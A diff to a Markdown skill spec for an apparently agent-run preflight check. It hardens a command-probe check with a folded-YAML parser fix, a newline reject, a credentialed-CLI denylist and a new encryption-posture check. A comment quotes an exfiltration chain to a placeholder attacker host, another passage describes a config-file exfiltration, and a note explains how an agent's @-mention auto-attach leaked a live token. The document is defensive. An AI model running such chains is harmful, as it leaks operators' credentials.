@@ -54,6 +54,7 @@ If the command fails (e.g., offline, no remote), every path-gated check falls ba
 | 9 (Node-only encodings) | Always runs (uses `git ls-files`, full-universe scan — does NOT use the cached path-set; see Sharp Edges). |
 | 10 (Discoverability test) | Zero matches for the canonical sensitive-path regex (re-use Check 6 SSOT). |
 | 11 (Register drift) | Zero matches for `(^\|/)apps/web-platform/supabase/migrations/.*\.sql$`, `(^\|/)apps/web-platform/server/workspace-resolver\.ts$`, or `(^\|/)knowledge-base/engineering/architecture/domain-model\.md$` (empty/missing cache → run, never SKIP). |
+| 12 (Encryption posture) | Zero matches for `\.tf$`, `supabase/migrations/.*\.sql$`, `cloud-init.*\.ya?ml$`, `docker-compose.*\.ya?ml$` (empty/missing cache → run, never SKIP). |
 | Not-Bare-Repo | Always runs. |
 
 For PR #3488-class diffs (lockfile bumps + orphan-cleanup deletions), Checks 1, 2, 5, 6, 7, 8 fast-skip → Checks 3 (lockfile fires), 4 (env isolation always), 9 (always), Not-Bare-Repo (always) execute. Of those four, only Check 3 and Check 9 do "real work" against the diff; Check 4 and Not-Bare-Repo are constant-cost.
@@ -726,7 +727,21 @@ discoverability_test:
   expected_output: "200"
 ```
 
-Detection: `awk '/^[[:space:]]*command:/'` returns the value on the same line after the colon, OR the next non-blank line if the value is a YAML `|` block-scalar.
+Form A accepts all three YAML scalar shapes for `command:`:
+
+| Shape | Header | Continuations joined with |
+| --- | --- | --- |
+| **inline** | `command: curl …` | — (value is on the key line) |
+| **block** | `command: \|`, `\|-`, `\|+` | newline |
+| **folded** | `command: >`, `>-`, `>+` | space |
+
+Block and folded headers may carry a trailing `# comment`. Scalar extent follows YAML
+indent semantics: a continuation is any non-empty line indented **more** than the
+`command:` key, and the first line indented **≤** the key ends the scalar. The parser is
+[`./scripts/parse-form-a.awk`](./scripts/parse-form-a.awk) — a real file rather than an
+inlined program, so the awk/TS parity harness executes the production runtime directly
+instead of regex-scraping this prose. That file is authoritative; the TypeScript mirror in
+`plugins/soleur/test/lib/discoverability-test-parser.ts` is non-authoritative.
 
 **Form B — prose + fenced block:**
 
@@ -743,12 +758,26 @@ Detection: find the first `discoverability_test` line in the Observability block
 ```bash
 PREFLIGHT_TMP="$(git rev-parse --git-dir)"
 # Form A first (anchored YAML key — strongest signal).
-CMD=$(awk '
-  /^[[:space:]]*command:[[:space:]]*\|/  { mode="block"; next }
-  /^[[:space:]]*command:/                { sub(/^[[:space:]]*command:[[:space:]]*/, ""); print; exit }
-  mode=="block" && /^[[:space:]]+[^[:space:]]/ { print; next }
-  mode=="block" && /^[[:space:]]*[^[:space:]]/ { exit }
-' "$PREFLIGHT_TMP/preflight-observability.txt")
+#
+# The parser lives in a real file so the parity harness can execute it. Resolve via
+# `git rev-parse --show-toplevel`, NOT `${CLAUDE_PLUGIN_ROOT:-plugins/soleur}` —
+# CLAUDE_PLUGIN_ROOT is unset in a plain session, which would silently make the path
+# CWD-relative.
+#
+# Hard-fail on a load error. `awk -f <missing>` exits 2 with EMPTY stdout, and
+# `set -uo pipefail` does NOT abort on it (command-substitution rc is discarded), so a
+# missing parser would leave $CMD empty and Form B would silently parse a DIFFERENT
+# command. Never fall through.
+FORM_A_AWK="$(git rev-parse --show-toplevel)/plugins/soleur/skills/preflight/scripts/parse-form-a.awk"
+test -r "$FORM_A_AWK" || { echo "FAIL: Check 10 parser missing at $FORM_A_AWK"; exit 1; }
+CMD=$(awk -f "$FORM_A_AWK" "$PREFLIGHT_TMP/preflight-observability.txt")
+AWK_RC=$?
+if [[ "$AWK_RC" -ne 0 ]]; then
+  # `$?` here would report the `!`-inverted status (always 0) — capture the real
+  # rc from the command substitution before emitting it.
+  echo "FAIL: Check 10 Form A parser errored (awk rc=${AWK_RC:-unknown}); refusing to fall through to Form B."
+  exit 1
+fi
 
 EXPECTED=$(awk '
   /^[[:space:]]*expected_output:/ { sub(/^[[:space:]]*expected_output:[[:space:]]*/, ""); print; exit }
@@ -921,6 +950,66 @@ fi
 # Falls through to Step 10.5 for kind == live-probe only.
 ```
 
+**Step 10.4c: Reject credentialed CLIs — `live-probe` only.**
+
+‼️ **This step MUST sit AFTER Step 10.4b's kind resolution.** The denylist below
+contains `gh`, and the canonical `run-log` command is
+`gh run view <run-id> --log | grep MARKER`. If this reject ran before kind
+resolution it would FAIL every correctly-written `run-log` plan — the reject
+exists to stop a credentialed command from being *executed*, and under `run-log`
+nothing is executed (10.4b has already exited with SKIP). The TypeScript mirror
+encodes the same placement: this reject lives in `substRejectReason`, the
+live-probe-only path, never in the unconditional `sshRejectReason`. Contrast the
+ssh reject in Step 10.4, which is unconditional *because* it guards endorsement
+rather than execution.
+
+**Reject credentialed CLIs** (the load-bearing control for the folded-scalar fix):
+
+Check 10 executes `$CMD` with the operator's ambient **file-backed** CLI auth reachable.
+`env -i` in Step 10.5 scrubs environment variables but **not** credentials on disk,
+because `HOME` is deliberately preserved — the Doppler CLI reads a live `dp.ct.*` token
+from its on-disk config in the home Doppler directory (`~/.doppler/`). Do not cite `env -i` as a mitigation for a
+credential-bearing command.
+
+This reject is required because fixing the folded-scalar parser (#6772) is a **fail-open
+transition**: commands that previously parsed to the literal `>` and self-rejected at
+Step 10.5 now parse correctly and reach execution. A folded scalar joins with a *space*
+and therefore carries no shell-active token by construction, so Step 10.5's reject set
+cannot constrain what a folded command *is* — only the verb rejects here can.
+
+```bash
+# Match against a QUOTE-STRIPPED copy: bash resolves `"doppler"`, `\doppler` and
+# `dopp""ler` to the same binary, but the word-boundary anchors below do not see
+# through the quote characters. Strip them from a COPY only — never from the string
+# that would be executed.
+CMD_DEQ="${CMD//[\"\'\\]/}"
+if [[ "$CMD_DEQ" =~ (^|[[:space:]]|/)(doppler|gh|aws|supabase|stripe|hcloud|wrangler|terraform|flyctl|vercel)([[:space:]]|$) ]]; then
+  echo "FAIL: discoverability_test.command invokes a credentialed CLI; refusing to run. Check 10 executes with the operator's ambient file-backed CLI auth reachable (env -i does NOT scrub it — \$HOME is preserved, so the Doppler CLI token, SSH private keys, netrc, git credentials, AWS credentials, the gcloud credentials database, and the Docker config are all readable). Use an unauthenticated probe, or see the Check-10 credentialed-probe design issue if this probe genuinely needs credentials."
+  exit 1
+fi
+```
+
+**This is a DENYLIST, and a denylist cannot be complete against a preserved `$HOME`.**
+It does NOT catch indirect invocation — `bash scripts/foo.sh` whose body self-wraps
+`doppler run -c prd`, a `curl --data-binary @<doppler-config>` exfiltration, or any
+credentialed verb not listed. Those remain reachable and are accepted for now; the durable
+fix is an ALLOWLIST of probe verbs (curl/dig/getent/bun/bash), tracked separately. Do not
+describe this reject as though it closed the class.
+<!-- SECURITY (at-mention auto-attach footgun): the exfil example above uses the
+     PLACEHOLDER `<doppler-config-file>`, NOT a real resolvable path. Never write an
+     at-sign immediately followed by a real home/absolute path (tilde-slash,
+     dollar-HOME-slash, or a `/home` `/Users` `/root` `/etc` absolute) in ANY
+     skill/agent/doc that loads into agent context: Claude Code's @-mention auto-attach
+     resolves such a token to the real on-disk file and attaches its CONTENTS to the
+     transcript. Observed 2026-07-22 during PR #6830's ship — the prior literal here
+     resolved to the operator's live Doppler root token and auto-attached it. The guard
+     .github/scripts/test/test-no-at-mention-credfile-footgun.sh enforces this repo-wide. -->
+
+The `(^|[[:space:]]|/)` … `([[:space:]]|$)` boundaries are load-bearing: the `/`
+alternative catches `/usr/local/bin/gh`, and the trailing boundary keeps legitimate
+probes runnable (a bare substring match would false-reject
+`curl https://app.soleur.ai/highlights` for containing `gh`).
+
 **Step 10.5: Sanitize and run with a tight timeout.**
 
 The block below uses a `text` fence (not `bash`) so the skill-security-scan
@@ -933,9 +1022,16 @@ is trust-on-PR-review. See [`2026-05-20-preflight-check-10-discoverability-test-
 # Defense-in-depth: reject every shell-active token before run. The plan file
 # is trust-on-PR-review but this regex is what blocks a malicious plan author
 # from chaining `; curl attacker.com?leak=$TOKEN` after a benign curl probe.
-# Rejects: ;, &&, ||, |, >, <, &, parameter expansion ($VAR or ${VAR}),
+# Rejects: ;, &&, ||, |, >, <, &, NEWLINE, parameter expansion ($VAR or ${VAR}),
 # command substitution $(), backticks, process substitution <(/>().
-if [[ "$CMD" =~ (\$\(|\`|\<\(|\>\(|\;|\&\&|\|\||\||\>|\<|\&|\$\{?[A-Za-z_]) ]]; then
+#
+# SCOPE OF THE NEWLINE REJECT: it closes BLOCK-mode command chaining only. A block
+# scalar joins continuations with \n, which `bash -c` runs as separate statements —
+# verified before this was added: a second `touch` line in a block scalar executed.
+# It contributes ZERO coverage to folded scalars, which join with a SPACE and carry no
+# shell-active token; those are covered by Step 10.4's credentialed-CLI reject. Do not
+# cite this reject as a mitigation for the folded-command class.
+if [[ "$CMD" =~ (\$\(|\`|\<\(|\>\(|\;|\&\&|\|\||\||\>|\<|\&|$'\n'|\$\{?[A-Za-z_]) ]]; then
   echo "FAIL: discoverability_test.command contains shell-active token; refusing to run."
   exit 1
 fi
@@ -991,7 +1087,7 @@ On **FAIL**, abort with the diagnostic table (command, exit code, sanitized stdo
 On **FAIL**, present the failure reason + sanitized command + diagnostic and offer **AskUserQuestion**:
 
 1. "Fix the plan's `discoverability_test.command` now" — open the plan file at the line of the `discoverability_test:` key. Re-run Check 10.
-2. "Skip — temporarily defer (logs a trim-tracker issue)" — `gh issue create --label 'priority/p3-low,chore'` with the failure as the body. Continue the preflight run with this check noted as DEFERRED.
+2. "Skip — temporarily defer (logs a trim-tracker issue)" — `gh issue create --label 'priority/p3-low,chore'` with the command, the exit code and the `expected_output` as the body. **Never include `$DT_STDOUT_SAFE` in the issue body.** `sanitize()` strips only C0 controls, not secrets or PII: a probe's stdout routinely carries log rows with user emails, client IPs, and bearer/`dp.ct.*` tokens, and this repository is PUBLIC. The captured stdout stays in the local run output for the operator; it does not get published. Continue the preflight run with this check noted as DEFERRED.
 3. "Abort — fix elsewhere" — stop the pipeline.
 
 **Result:**
@@ -1090,6 +1186,46 @@ breaks the numeric test).
   newest `apps/web-platform/supabase/migrations/*.sql`."
 - **SKIP** — no business-rule surface (or the register) in the diff.
 
+### Check 12: Encryption Posture
+
+Enforces the encryption-posture ledger's maintenance contract (ADR-140): every persistent
+store and cross-component connection Soleur operates must carry a ledger row whose cited
+evidence resolves to real code, and any accepted plaintext/unverified-TLS exception must carry
+an open, unexpired tracking issue. Consumes the deterministic analyzer
+`lint-encryption-posture.py` (repo-root `scripts/`) — this check does NOT reimplement its PASS/FAIL logic in
+prose; it shells out and relays the exit code.
+
+**Step 12.1 — diff-scope (fast-path SKIP).** SKIP unless the cached path-set
+(`"$PREFLIGHT_TMP/preflight-diff-files.txt"`) matches a store-class or connection-class surface:
+
+```bash
+DIFF="$PREFLIGHT_TMP/preflight-diff-files.txt"
+# Fail-safe: never SKIP on a missing/empty cache — recompute inline, then run if still empty.
+if [[ ! -s "$DIFF" ]]; then git diff --name-only origin/main...HEAD > "$DIFF" 2>/dev/null || true; fi
+if [[ -s "$DIFF" ]] && ! grep -qE '\.tf$|supabase/migrations/.*\.sql$|cloud-init.*\.ya?ml$|docker-compose.*\.ya?ml$' "$DIFF"; then
+  echo "SKIP — no store-class or connection-class surface (*.tf / migration / cloud-init / docker-compose) in diff"; exit 0
+fi
+```
+
+This mirrors "I do not apply", never "I cannot prove it" (`2026-04-27-preflight-security-gates-skip-vs-fail-defaults.md`) — an empty/missing diff cache falls through to run, it never SKIPs by default.
+
+**Step 12.2 — run the Layer A sweep:**
+
+```bash
+python3 scripts/lint-encryption-posture.py --repo-sweep > "$PREFLIGHT_TMP/encryption-posture.txt" 2>&1; rc=$?
+```
+
+**Result:**
+
+- **PASS** — `rc == 0`. Every store/connection in the repo has a ledger row whose cited evidence
+  resolves to real code, and every accepted exception carries an open, unexpired tracking issue.
+- **FAIL** — `rc != 0`: relay the script's own output (`cat "$PREFLIGHT_TMP/encryption-posture.txt"`)
+  verbatim — the classes it can report include an unledgered store, an unresolvable citation, an
+  expired or untracked exception, or a store/connection disclosed as encrypted while its ledger row
+  says otherwise. Do not re-derive the verdict from this SKILL.md — the script is the single source
+  of truth for the pass/fail decision.
+- **SKIP** — the cached path-set contains zero `.tf` / store-class / connection-class paths.
+
 ## Phase 2: Aggregate Go/No-Go Report
 
 After all checks complete, aggregate results into a structured report:
@@ -1138,5 +1274,11 @@ Preflight validation passed. Return control to the calling orchestrator.
 - **Triple-SSOT for `SENSITIVE_PATH_RE`.** The literal lives at Check 6 Step 6.1, Check 10 Step 10.1, AND `plugins/soleur/skills/deepen-plan/SKILL.md` Phase 4.6 Step 2. All three MUST stay byte-identical. The Check 10 regression test (`plugins/soleur/test/preflight-discoverability-test.test.ts`) asserts ≥2 matches in `preflight/SKILL.md`; the canonical grep is `grep -cF "SENSITIVE_PATH_RE='^(apps/web-platform" plugins/soleur/skills/preflight/SKILL.md plugins/soleur/skills/deepen-plan/SKILL.md`. `grep -cF` is substring-based and tolerates the 2-space indentation difference between top-level (preflight) and markdown-bullet (deepen-plan) contexts — keep AC2's grep un-anchored.
 - **Shared Plan-File Resolution is a SSOT.** Both Check 6 Step 6.2 and Check 10 Step 10.2 call it. A future PR that changes the scrub/extract logic must edit the shared sub-section once — both consumers pick it up. Do NOT copy-paste the logic back into a caller block.
 - **Check 10 parser duality (Form A YAML vs Form B prose+fence).** PR #4148 used Form B; the canonical template uses Form A. Both must be accepted OR Check 10 silently SKIPs on currently-valid plans. The TS reference impl at `plugins/soleur/test/lib/discoverability-test-parser.ts` exercises both forms across the whole `plugins/soleur/test/fixtures/preflight-check-10/` set. Note the asymmetry introduced by `kind`: `kind:`/`marker:` are **Form A only**, so a prose `Kind:` inside a Form B block FAILs (guardrail 6) rather than silently defaulting to `live-probe`.
+- **Rule order in `parse-form-a.awk` IS the bug (#6772).** The inline rule `/^[[:space:]]*command:/` matches EVERY `command:` line, including `command: >-` and `command: |`. If it is ever moved ahead of the fold/block header rules it returns the literal indicator, which then self-rejects against Step 10.5's shell-active `>` branch — a check that cannot parse its input, reporting a shell injection the plan does not have. AC1 and fixtures F1–F3 are the pins; do not drop them when refactoring.
+- **Anchoring the header regex is a bug generator.** A bare `$` anchor made `command: >- # note` fall through to inline and reproduce #6772 exactly. Any future tightening of the header must keep the comment-tolerant `(#.*)?$` tail and re-run the F1–F3 comment column.
+- **`indent()` returns 0 on a blank line**, which is `<= key` for every scalar. The blank-line skip rule MUST stay above the indent terminator or every scalar ends at its first blank line (fixture N6).
+- **`env -i` does not scrub file-backed CLI auth.** Step 10.5 preserves `HOME`, so the Doppler CLI's on-disk token stays reachable by any command Check 10 executes. Never cite `env -i` as a mitigation for a credential-bearing command — Step 10.4c's verb rejects are what cover that class.
+- **The shell-active reject does not bound a folded command.** Folding joins with a space, so a folded scalar has no `;`/`|`/`$()` by construction and passes Step 10.5 automatically — it can append *arguments* but never chain a command. That makes fold safer than block for injection, but it also means no token in the Step 10.5 set constrains what a folded command *is*. Reasoning "the reject will catch it" about a folded command is reasoning about the wrong gate.
+- **The credentialed-CLI reject is `live-probe`-only, and that placement is load-bearing.** It sits at Step 10.4c, AFTER 10.4b resolves `kind`, because `gh` is on the denylist and the canonical `run-log` command is `gh run view <run-id> --log | grep MARKER`. Hoisting it above kind resolution — or into the unconditional ssh reject — FAILs every correct `run-log` plan. In the TS mirror it lives in `substRejectReason`, never `sshRejectReason`.
 - **`bash -c "$CMD"` stdout always ends in `\n`.** The matcher MUST normalize trailing newlines (via `sanitize()` or `${var%$'\n'}`) before substring comparison, or `expected_output: 200` fails when production correctly emits `200\n`.
 - **The `\b` word-boundary trap.** Bash `[[ $x =~ \bssh \b ]]` matches `ssh ` only when whitespace is on BOTH sides; trailing-EOF or trailing-newline `ssh ` does NOT match. Always use `(^|[^A-Za-z0-9_.-])ssh([^A-Za-z0-9_.-]|$)` — the canonical Check 10 reject form — when checking for `ssh` in operator-facing prose. A `[[:space:]]`-only delimiter class is NOT sufficient: it misses `|ssh`, `;ssh`, `&&ssh` and `"ssh"`. The negated word class is also the only form that cannot drift between bash ERE and the JS mirror (JS `\s` matches Unicode separators that bash `[[:space:]]` in C-locale does not).
